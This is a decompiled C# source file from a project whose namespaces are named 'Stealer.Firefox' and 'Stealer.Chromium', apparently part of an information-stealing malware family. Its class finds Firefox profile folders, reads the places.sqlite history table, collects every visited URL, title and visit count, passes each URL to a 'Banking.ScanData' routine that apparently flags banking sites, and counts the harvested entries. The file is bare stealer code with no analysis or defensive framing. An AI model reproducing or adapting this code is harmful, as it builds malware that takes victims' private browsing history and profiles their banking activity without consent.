using System;
using System.Collections.Generic;
using System.IO;
using Stealer.Chromium;

namespace Stealer.Firefox
{
	// Token: 0x02000027 RID: 39
	internal class cHistory
	{
		// Token: 0x060000B8 RID: 184 RVA: 0x00006BD4 File Offset: 0x00004DD4
		private static string GetHistoryDBPath(string path)
		{
			try
			{
				string path2 = path + "\\Profiles";
				if (Directory.Exists(path2))
				{
					foreach (string str in Directory.GetDirectories(path2))
					{
						if (File.Exists(str + "\\places.sqlite"))
						{
							return str + "\\places.sqlite";
						}
					}
				}
			}
			catch
			{
			}
			return null;
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00006C48 File Offset: 0x00004E48
		public static List<Site> Get(string path)
		{
			List<Site> list = new List<Site>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(cHistory.GetHistoryDBPath(path), "moz_places");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Site item = default(Site);
					item.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					item.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					item.iCount = Convert.ToInt32(sqlite.GetValue(i, 4)) + 1;
					if (item.sTitle != "0")
					{
						Banking.ScanData(item.sUrl);
						Counter.History++;
						list.Add(item);
					}
				}
				return list;
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return new List<Site>();
		}
	}
}
